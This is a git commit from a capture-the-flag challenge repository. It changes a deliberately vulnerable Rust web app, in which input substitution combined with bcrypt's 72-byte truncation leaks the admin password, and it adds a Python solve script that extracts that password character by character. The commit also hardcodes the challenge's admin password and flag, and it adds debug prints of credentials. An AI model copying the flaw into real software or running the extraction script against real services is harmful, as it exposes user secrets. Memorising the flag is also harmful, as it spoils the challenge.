98cdbb2628c6198315e71028889988a987d838d0
Malik Mouhiidine <malikprofessional2020@gmail.com>
2024-05-16 10:39:03 +0100

    Update

--- web/Rusty_Road/attachments/rustyroad/src/main.rs
+++ web/Rusty_Road/attachments/rustyroad/src/main.rs
@@ -12,14 +12,8 @@ use rand::distributions::Alphanumeric;
 use lazy_static::lazy_static;
 use rocket::http::Cookie;
 use rocket::http::CookieJar;
-use aes::Aes128;
-use block_modes::{BlockMode, Cbc};
-use block_modes::block_padding::Pkcs7;
-use hex::encode as hex_encode;
 use std::sync::Mutex;
-use bcrypt::{hash, DEFAULT_COST};
-
-type Aes128Cbc = Cbc<Aes128, Pkcs7>;
+use bcrypt::{hash, verify, DEFAULT_COST};
 
 lazy_static! {
     static ref SECRET: String = {
@@ -31,19 +25,16 @@ lazy_static! {
         secret
     };
 
+    static ref ADMIN_PASSWORD: String = "M07H4F7H38167Hr33175JU57816M3".to_string();
+
+    static ref FLAG: String = "AKASEC{W311_17_41n7_7h47_2u57yyy_4f732_411}".to_string();
+
     static ref USERS: Mutex<Vec<User>> = Mutex::new(vec![
         User {
             username: "admin".to_string(),
-            password: ADMIN_PASSWORD.clone(),
+            password: hash_password(&ADMIN_PASSWORD),
         }
     ]);
-
-    // TODO: REPLACE THE BELOWW SECRET DATA WHEN GIVING THE ATTACHMENTS
-
-    static ref ADMIN_PASSWORD: String = hash_password("M07H4F7H38167Hr33175JU57816M3");
-
-    static ref AES_KEY: [u8; 16] = [0xf0, 0xb1, 0x02, 0xe3, 0x04, 0x05, 0xa6, 0x07, 0x08, 0x99, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f];
-    static ref AES_IV: [u8; 16] = [0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x06, 0x17, 0x18, 0xf9, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f];
 }
 
 #[derive(Debug, Deserialize, Serialize)]
@@ -59,16 +50,19 @@ struct RegisterForm {
     password: String,
 }
 
+#[derive(Debug)]
 struct User {
     username: String,
     password: String,
 }
 
 fn add_user(username: &str, password: &str) {
+    println!("{:?}", USERS.lock().unwrap());
     USERS.lock().unwrap().push(User {
         username: username.to_string(),
         password: password.to_string(),
     });
+    println!("{:?}", USERS.lock().unwrap());
 }
 
 fn validate_token(token: &str) -> Result<TokenData<Claims>> {
@@ -76,20 +70,7 @@ fn validate_token(token: &str) -> Result<TokenData<Claims>> {
     decode::<Claims>(token, &decoding_key, &Validation::new(Algorithm::HS256))
 }
 
-fn encrypt(secret: &str) -> String {
-    let cipher = Aes128Cbc::new_from_slices(&AES_KEY.as_slice(), &AES_IV.as_slice()).unwrap();
-    let cipher_text = cipher.encrypt_vec(secret.as_bytes());
-    hex_encode(&cipher_text)
-}
-
-fn decrypt(secret: &str) -> String {
-    let cipher = Aes128Cbc::new_from_slices(&AES_KEY.as_slice(), &AES_IV.as_slice()).unwrap();
-    let cipher_text = hex::decode(secret).unwrap();
-    let decrypted = cipher.decrypt_vec(&cipher_text).unwrap();
-    String::from_utf8(decrypted).unwrap()
-}
-
-fn template(input: String) -> String {
+fn subs(input: String) -> String {
     input.replace("ADMIN_PASSWORD", &ADMIN_PASSWORD)
 }
 
@@ -109,14 +90,15 @@ fn register_form() -> (ContentType, &'static str) {
 #[post("/register", data = "<form>")]
 fn register(form: Form<RegisterForm>, cookies: &CookieJar<'_>) -> Redirect {
 
-    let username = template(form.username.clone());
+    let username = subs(form.username.clone());
     if username.contains("admin") || username.contains(ADMIN_PASSWORD.as_str()) {
         return Redirect::to("/register");
     }
 
-    let password = template(form.password.clone());
+    let password = subs(form.password.clone());
     let password = hash_password(&password);
 
+    //println!("{:?}, {:?}", username, password);
     add_user(&username, &password);
 
     let claims = Claims {
@@ -142,13 +124,17 @@ fn login_form() -> (ContentType, &'static str) {
 
 #[post("/login", data = "<form>")]
 fn login(form: Form<RegisterForm>, cookies: &CookieJar<'_>) -> Redirect {
-    let username = template(form.username.clone());
-    let password = template(form.password.clone());
+    let username = subs(form.username.clone());
+    let password = subs(form.password.clone());
 
     let users_lock = USERS.lock().unwrap();
+
     let user = users_lock.iter().find(|user| user.username == username);
     if let Some(user) = user {
-        if hash_password(&password) == user.password {
+        println!("{:?}", username);
+        println!("{:?}", password);
+        println!("{:?}", users_lock);
+        if verify(&password, &user.password).unwrap() {
             let user_type = if username == "admin" {
                 "admin".to_string()
             } else {
@@ -176,7 +162,7 @@ fn home(cookies: &CookieJar<'_>) -> String {
     match validate_token(token) {
         Ok(data) => {
             if data.claims.user_type == "user" {
-                "Hello User".to_string()
+                format!("Hello {}", data.claims.username)
             }
             else if data.claims.user_type == "admin" {
                 "Hello Admin".to_string()
@@ -188,18 +174,13 @@ fn home(cookies: &CookieJar<'_>) -> String {
     }
 }
 
-#[get("/admin")]
-fn admin(cookies: &CookieJar<'_>) -> String {
+#[get("/flag")]
+fn flag(cookies: &CookieJar<'_>) -> String {
     let token = cookies.get("token").map(|cookie| cookie.value()).unwrap_or("");
     match validate_token(token) {
         Ok(data) => {
             if data.claims.user_type == "admin" {
-                // THERE IS NOTHING HERE!!
-                // PLEASE TRUST ME!!
-                // DONT WASTE YOUR TIME!!
-                // AM NOT BEING SARCASTIC!!
-                // ITS NOT THAT EASY!!
-                decrypt("1a29f088b6dd1238afddc786b0bf6b55169a63cb00479448e53460bd1e34b8550c23ba71ab533225f0ffe9f6912986e1b55671cb3e1f24d397057e6920478a0503eeb56fd798a69c7f4b933b78f920ad0ca2e156be96e9aeabde2f61e30a1303a956b9f422ae9d78a1b65b237b61ec34e106b4f80268a18ecfb518a2ade75fb9994d444ae73dcd04b57af017d15822d4")
+                FLAG.clone()
             } else {
                 "Access Denied".to_string()
             }
@@ -210,6 +191,5 @@ fn admin(cookies: &CookieJar<'_>) -> String {
 
 #[launch]
 fn rocket() -> _ {
-
-    rocket::build().mount("/", routes![register_form, register, home, admin])
+    rocket::build().mount("/", routes![register_form, register, home, flag, login_form, login])
 }
---
+++ web/Rusty_Road/solve/script.py
@@ -0,0 +1,37 @@
+import random
+import string
+from time import sleep
+
+import requests
+
+base = "http://127.0.0.1:8000/"
+
+N = 10
+ADMIN_PASSWORD = ""
+
+while True:
+    username = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
+    password = "A" * (71 - len(ADMIN_PASSWORD)) + "ADMIN_PASSWORD"
+
+    response = requests.post(base + "register",
+                             {"username": username, "password": password})
+    sleep(0.1)
+
+    if response.ok:
+        for i in string.printable:
+            password = "A" * (71 - len(ADMIN_PASSWORD)) + ADMIN_PASSWORD + i
+            response = requests.post(base + "login",
+                                     data={"username": username, "password": password},
+                                     allow_redirects=False)
+            sleep(0.1)
+            if response.headers["location"] == "/":
+                print(f"Found character: |{i}|")
+                ADMIN_PASSWORD += i
+                break
+            elif response.headers["location"] == "/login":
+                continue
+            else:
+                raise Exception(":/")
+        else:
+            break
+    print(f"Current ADMIN_PASSWORD: |{ADMIN_PASSWORD}|")
